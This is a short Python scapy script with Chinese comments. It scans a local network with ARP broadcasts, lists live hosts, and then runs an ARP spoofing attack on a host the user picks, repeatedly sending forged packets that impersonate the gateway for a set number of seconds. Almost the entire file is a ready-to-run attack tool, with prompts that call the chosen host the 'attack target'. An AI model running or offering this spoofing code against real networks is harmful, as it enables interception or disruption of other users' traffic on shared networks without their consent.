#coding:utf-8
#局域网扫描器,使用ARP扫描
from scapy.all import *
import time

from scapy.layers.l2 import Ether, ARP
'''
wifi='PandoraBox'
#wifi='Realtek 8821AE Wireless LAN 802.11ac PCI-E NIC'
#扫描局域网，显示活跃主机
for line in os.popen('route print'):
    print 'line=', line
    s=line.strip()   #去掉每行的空格
    if s.startswith('0.0.0.0'):
        slist=s.split()
        ip=slist[3]       #本机IP
        gw=slist[2]       #本机网关
        break
'''
wifi='en0'
ip='192.168.123.38'
gw='192.168.123.1'
print '本机上网的IP是：',ip
print '本机上网的网关是：', gw
tnet=gw+'/24'      #本网络

#构造一个ARP广播包，向整个网络的每台主机发起ARP广播
p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)
#ans 表示收到的包的回复
ans, unans = srp(p, iface=wifi, timeout=2, verbose=0)
print("一共扫描到%d台主机：" % len(ans))
#将需要的IP地址和Mac地址存放在result列表中
result = []
for s, r in ans:
    # 解析收到的包，提取出需要的IP地址和MAC地址
    result.append([r[ARP].psrc, r[ARP].hwsrc])
result.sort()
#打印出活跃主机的IP地址和MAC地址
ips=[]
for ip, mac in result:
    ips.append(ip)
    print(ip, "------>", mac)

target=input("请输入攻击目标索引：")
t=int(input("请输入攻击时间（S）:"))

#构造一个欺骗数据包，告诉被攻击者，我是网关
p1=Ether(dst='ff:ff:ff:ff:ff:ff', src='c8:3d:d4:7b:c1:47')/ARP(pdst=ips[target], psrc=gw)
#周期性的发包,欺骗模式
print("攻击开始。。。")
for i in range(10*int(t)):
    sendp(p1, verbose=0)
    time.sleep(1)
print("攻击结束。。。")

